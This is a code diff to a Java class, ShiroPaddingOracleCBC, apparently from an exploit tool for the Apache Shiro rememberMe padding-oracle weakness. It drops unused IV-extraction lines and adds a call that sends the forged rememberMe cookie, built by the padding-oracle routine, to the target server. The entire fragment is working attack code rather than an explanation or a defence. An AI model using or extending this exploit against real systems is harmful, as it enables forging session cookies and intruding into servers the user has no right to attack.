@@ -60,9 +60,6 @@ public class ShiroPaddingOracleCBC extends Shiro {
 
   private void attack(byte[] bytes) {
     byte[] originRememberMe = Base64.getDecoder().decode(rememberMe.getBytes());
-    //aes iv bytes
-    byte[] ivBytes = Arrays.copyOfRange(originRememberMe, 0, 16);
-    byte[] cryptTextBytes = Arrays.copyOfRange(originRememberMe, ivBytes.length, originRememberMe.length);
 
     CBCResult cbcResult = PaddingOracleCBCForShiro
         .paddingOracleCBC(bytes, data -> {
@@ -82,6 +79,7 @@ public class ShiroPaddingOracleCBC extends Shiro {
     System.arraycopy(cbcResult.getCrypt(), 0, remenberMe, cbcResult.getIv().length,
         cbcResult.getCrypt().length);
     System.out.println("remenberMe=" + Base64.getEncoder().encodeToString(remenberMe));
+    request(remenberMe);
   }
 
   private boolean request(byte[] data) {
